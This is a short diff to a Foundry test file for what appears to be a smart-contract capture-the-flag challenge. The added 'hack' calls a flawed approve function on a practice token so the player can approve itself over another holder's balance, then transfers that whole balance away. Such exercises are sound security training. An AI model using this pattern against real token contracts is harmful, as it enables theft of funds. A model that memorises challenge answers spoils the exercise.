@@ -28,6 +28,12 @@ contract Challenge0Test is Test {
         //    Add your hack below!    //
         //////////////////////////////*/
 
+        VToken t = VToken(token);
+        uint256 amount = t.balanceOf(vitalik);
+        t.approve(vitalik, player, amount);
+
+        t.transferFrom(vitalik, player, amount);
+
         //============================//
 
         vm.stopPrank();
